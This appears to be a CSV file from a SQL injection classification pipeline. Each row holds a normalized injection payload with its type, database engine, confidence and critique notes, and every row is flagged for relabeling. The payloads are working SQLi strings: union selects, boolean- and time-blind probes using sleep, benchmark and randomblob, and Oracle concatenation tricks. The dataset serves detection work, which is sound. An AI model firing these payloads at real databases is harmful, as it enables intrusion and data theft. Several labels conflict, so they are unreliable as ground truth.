payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,22800,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--"
1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'uwbt' like 'uwbt,error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,22801,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'uwbt' like 'uwbt
select ( case when ( 4994 = 1572 ) then 4994 else 4994* ( select 4994 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,22802,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4994 = 1572 ) then 4994 else 4994* ( select 4994 from mysql.db ) end ) #
-2784 ) where 5261 = 5261 or 3472 = 1728#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,22803,boolean_blind,generic,Pattern match: 'or 3472 = 1728' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2784 ) where 5261 = 5261 or 3472 = 1728#
"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""fqap"" like ""fqap",boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,22804,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""fqap"" like ""fqap"
"1"" ) rlike sleep ( 5 ) and ( ""rfsd"" = ""rfsd",time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,22805,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) rlike sleep ( 5 ) and ( ""rfsd"" = ""rfsd"
1'|| ( select 'xmoq' from dual where 8047 = 8047 and 7533 = 7533 ) ||',boolean_blind,oracle,0.7,concat_equality,RELABEL,reasoning too short (15 chars),boolean_blind,oracle,22806,boolean_blind,oracle,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'xmoq' from dual where 8047 = 8047 and 7533 = 7533 ) ||'
1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( '%' = ',time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,22807,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( '%' = '
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""uhvy"" = ""uhvy",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,22808,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""uhvy"" = ""uhvy"
1 and ( 1977 = 6852 ) *6852-- clxl,boolean_blind,generic,0.5,arithmetic,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,22809,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 and ( 1977 = 6852 ) *6852-- clxl
"1' ) as xhmm where 8092 = 8092 union all select null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,22810,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as xhmm where 8092 = 8092 union all select null,null,null--"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,22811,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- ygbf"
